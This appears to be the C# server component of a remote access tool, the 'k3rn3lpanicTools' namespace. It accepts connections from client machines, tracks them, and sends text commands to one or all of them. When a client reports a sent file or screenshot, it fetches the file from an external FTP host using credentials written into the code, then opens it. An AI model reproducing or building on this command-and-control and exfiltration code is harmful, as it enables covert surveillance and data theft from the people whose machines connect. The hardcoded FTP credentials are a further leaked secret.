using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace k3rn3lpanicTools
{
    public class Server
    {
        public enum ServerStat
        {
            WaitingForFile,
            WaitingForText,
            WaitingForcmdRes
        }

        static int cntall = 0;
        private static IPAddress myIP;
        private static int port;
        private static TcpListener mTCPListener;
        public static List<TcpClient> mClients;
        public static IDictionary<string, TcpClient> TCPCLS;
      
        public static bool KeepRunning { get; set; }

       

        public static async void StartListeningForIncomingConnection(IPAddress _ip, int _port, RichTextBox l = null, ListBox ls = null, bool notfirst = false)
        {
            


            if (TCPCLS == null)
            {
                TCPCLS = new Dictionary<string, TcpClient>();
            }
            if (mClients == null)
            {
                mClients = new List<TcpClient>();
            }
            if (l == null)
                l = new RichTextBox();
            if (ls == null)
                ls = new ListBox();

            Console.WriteLine("Listening for Incoming Request ...");

            myIP = _ip;
            port = _port;

            if (myIP == null)
                myIP = IPAddress.Any;
            mTCPListener = new TcpListener(myIP, port);
            l.Text += "\nListening On : " + Networkinfo.PublicIPAddress_m1() + ":" + _port.ToString();
            try
            {
                mTCPListener.Start();
                KeepRunning = true;

                while (KeepRunning)
                {
                    var returnedbyAccept = await mTCPListener.AcceptTcpClientAsync();
                    mClients.Add(returnedbyAccept);
                    l.Text += "\n" + string.Format("New Client Connected , count : {0} - {1}", mClients.Count, returnedbyAccept.Client.RemoteEndPoint);

                    Console.WriteLine(string.Format("New Client Connected , count : {0} - {1}", mClients.Count, returnedbyAccept.Client.RemoteEndPoint));
                    byte[] HostName = Encoding.UTF8.GetBytes(SystemInfo.GetInfo(SystemInfo.InfoType.Machinename));
                    await returnedbyAccept.GetStream().WriteAsync(HostName, 0, HostName.Length);
                    ls.Items.Add(returnedbyAccept.Client.RemoteEndPoint.ToString());
                    TCPCLS.Add(returnedbyAccept.Client.RemoteEndPoint.ToString(), returnedbyAccept);
                    TakeCareOfTCPclient(returnedbyAccept, l, ls);
                    //what is here will be executed after the up line

                }
            }
            catch (Exception ex)
            {

                Console.WriteLine(ex.Message);
            }



        }
        private static void AppendAllBytes(string path, byte[] bytes)
        {
            //argument-checking here.

            using (var stream = new FileStream(path, FileMode.Append))
            {
                stream.Write(bytes, 0, bytes.Length);
            }
        }
        private async static void TakeCareOfTCPclient(TcpClient ParamClient, RichTextBox l, ListBox ls)
        {
            NetworkStream stream = null;
            StreamReader reader = null;
            try
            {
                stream = ParamClient.GetStream();
                reader = new StreamReader(stream);
                /*
                MemoryStream receivedData = new MemoryStream();
                do
                {
                    byte[] buffer = new byte[1024];
                    int numberOfBytesRead = 0;
                    numberOfBytesRead =await stream.ReadAsync(buffer, 0, buffer.Length); //Read from network stream
                    receivedData.Write(buffer, 0, buffer.Length); //Write to memory stream
                } while (stream.DataAvailable);

                File.WriteAllBytes("foo.jpg", receivedData.ToArray());
                return;
                */
                
                char[] buff;
                while (KeepRunning && mClients.Contains(ParamClient))
                {
               
                   
                        buff = new char[1000];
                        int Nret = await reader.ReadAsync(buff, 0, buff.Length);

                        byte[] _buff = Encoding.UTF8.GetBytes(buff);
                        Console.WriteLine("Returned : " + Nret);
                        if (Nret == 0)
                        {
                            RemoveClient(ParamClient, l, ls);
                            Console.WriteLine("Socket Disconnected");
                            l.Text += "\nSocket Disconnected";
                            break;
                        }
                        string recivedtext = new string(buff).Replace("\0", string.Empty);

                        Console.WriteLine("*** RECIVED : " + recivedtext + "\nFrom:" + ParamClient.Client.RemoteEndPoint.ToString());
                        l.Text += recivedtext;
                        if (recivedtext.StartsWith("File Sent."))
                        {
                            new FTPClient("ftp://3287871599.cloudylink.com", "frdiuh", "T63NyMC9Zmkh7w", false).DoWork("capt.jpg");
                            l.Text += "\nFile Saved : capt.panic";
                            System.Diagnostics.Process.Start("capt.jpg");
                        }
                        else if (recivedtext.StartsWith("FileReqsent-"))
                        {
                        string nametosave = recivedtext.Substring(12);
                        new FTPClient("ftp://3287871599.cloudylink.com", "frdiuh", "T63NyMC9Zmkh7w", false).DoWork(Path.GetFileName(nametosave));
                        l.Text += "\nSaved File.";
                        System.Diagnostics.Process.Start(nametosave);
                        }
                    //l.Text += "\n"+recivedtext;

                    Array.Clear(buff, 0, buff.Length);
                        
                    
                    
                }

            }
            catch (Exception ex)
            {
                //RemoveClient(ParamClient, l, ls);
                Console.WriteLine(ex.Message);
            }
        }

       

        public static async void SendStrToSpecificClient(string ClientName, string Data)
        {
            if (TCPCLS.ContainsKey(ClientName))
            {
                byte[] tobesend = Encoding.UTF8.GetBytes(Data);
                await TCPCLS[ClientName].GetStream().WriteAsync(tobesend, 0, tobesend.Length);
            }
        }
        public static string SearchByClient(TcpClient ParamClient)
        {

            for (int i = 0; i < TCPCLS.Count; i++)
            {
                if (TCPCLS[TCPCLS.ToList()[i].Key] == ParamClient)
                {
                    return TCPCLS.ToList()[i].Key;
                }
            }
            return "";
        }
        public static void RemoveClient(TcpClient paramClient, RichTextBox l, ListBox ls)
        {
            if (mClients.Contains(paramClient))
            {
                mClients.Remove(paramClient);

                Console.WriteLine(string.Format("Client Removed, Count : {0}", mClients.Count));
                l.Text += "\n" + string.Format("Client Removed, Count : {0}", mClients.Count);
                TCPCLS.Remove(SearchByClient(paramClient));
               
                ls.Items.Remove(paramClient.Client.RemoteEndPoint.ToString());
                //paramClient.Client.Close();
            }
        }
        public static void StopServer(RichTextBox l)
        {
            try
            {
                if (mTCPListener != null)
                {
                    mTCPListener.Stop();
                    foreach (TcpClient c in mClients)
                    {
                        c.Close();
                    }
                    mClients.Clear();
                    KeepRunning = false;
                    l.Text += "\n" + "Server is Shut Down.";
                }
            }
            catch (Exception exx)
            {
                Console.WriteLine(exx.Message);

            }
        }
        public static async void Sendstr(string message, TcpClient cl)
        {

        }
        public static async Task SendStrToAll(string message)
        {
            if (string.IsNullOrEmpty(message))
                return;
            try
            {
                byte[] buffMessage = Encoding.UTF8.GetBytes(message);
                foreach (TcpClient c in mClients)
                {

                    await c.GetStream().WriteAsync(buffMessage, 0, buffMessage.Length);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}
//asoidjasoidjaosdjasdjasodjoasdjasoidjoi
//asdoiasjdo